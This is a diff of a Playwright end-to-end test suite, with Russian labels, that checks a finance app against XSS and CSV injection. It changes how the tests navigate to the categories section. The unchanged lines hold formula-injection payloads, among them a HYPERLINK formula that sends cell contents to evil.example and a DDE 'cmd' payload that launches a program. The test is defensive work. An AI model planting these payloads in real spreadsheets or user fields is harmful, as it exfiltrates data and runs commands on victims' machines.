@@ -149,8 +149,7 @@ test.describe('XSS и CSV-инъекция через пользовательс
     await newPage(page);
     await createWallet(page, { name: PAYLOADS[0]!, opening: '10' });
     // категория с разметкой в названии
-    await goSection(page, 'Настройки');
-    await page.getByRole('link', { name: 'Категории' }).click();
+    await goSection(page, 'Категории');
     await page.getByRole('button', { name: 'Добавить', exact: true }).click();
     await sheet(page, /Новая категория/).getByRole('textbox', { name: 'Название' }).fill(PAYLOADS[2]!);
     await sheet(page, /Новая категория/).getByRole('button', { name: 'Сохранить', exact: true }).click();
@@ -203,8 +202,7 @@ test.describe('XSS и CSV-инъекция через пользовательс
     await newPage(page);
     const nasty = ['=HYPERLINK("http://evil.example/?"&A1,"x")', '+1+1', '-2+3', '@SUM(1+1)', "=cmd|' /C calc'!A0", '\t=1+1', ' =1+1', '=1+1\n=2+2'];
     await createWallet(page, { name: "=cmd|' /C calc'!A0", opening: '5' });
-    await goSection(page, 'Настройки');
-    await page.getByRole('link', { name: 'Категории' }).click();
+    await goSection(page, 'Категории');
     await page.getByRole('button', { name: 'Добавить', exact: true }).click();
     await sheet(page, /Новая категория/).getByRole('textbox', { name: 'Название' }).fill('=1+1');
     await sheet(page, /Новая категория/).getByRole('button', { name: 'Сохранить', exact: true }).click();
